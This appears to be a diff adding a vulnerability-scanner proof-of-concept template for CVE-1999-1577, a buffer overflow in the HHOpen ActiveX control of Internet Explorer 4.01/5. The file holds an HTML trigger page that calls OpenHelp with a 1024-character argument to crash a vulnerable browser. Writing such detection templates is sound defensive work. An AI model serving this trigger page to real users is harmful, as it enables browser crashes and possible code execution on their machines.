@@ -1,0 +1,60 @@
+[info]
+author = "ave"
+description = "验证 Microsoft Internet Explorer 4.01/5 中 HHOpen ActiveX 控件 (hhopen.ocx) OpenHelp 方法缓冲区溢出漏洞。通过构造包含超长参数的恶意 HTML 页面，诱导受害者使用易受攻击的 IE 访问即可触发缓冲区溢出。"
+id = "POC-AVE-1999-1195"
+name = "CVE-1999-1577 PoC"
+severity = "medium"
+tags = ["ave-1999-1195"]
+vuln_id = [
+    "CVE-1999-1577",
+    "AVE-1999-1195",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc-hhopen.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HHOpen ActiveX Buffer Overflow PoC - CVE-1999-1577</title>
+</head>
+<body>
+    <h1>CVE-1999-1577 HHOpen ActiveX Control Buffer Overflow PoC</h1>
+    <p>This page demonstrates the buffer overflow in HHOpen ActiveX control (hhopen.ocx) OpenHelp method.</p>
+    <object id="hhopen" classid="clsid:2C6F4FC0-5B8A-11D0-9C3A-00A0C908DB96" width="0" height="0"></object>
+    <script>
+        try {
+            var overflow = "A".repeat(1024);
+            hhopen.OpenHelp(overflow);
+            document.write("<p>OpenHelp method called with long argument. Check for crash in vulnerable IE.</p>");
+        } catch (e) {
+            document.write("<p>Error: " + e.message + "</p>");
+        }
+    </script>
+</body>
+</html>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/html"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "HHOpen ActiveX Control Buffer Overflow PoC",
+    "CVE-1999-1577",
+]
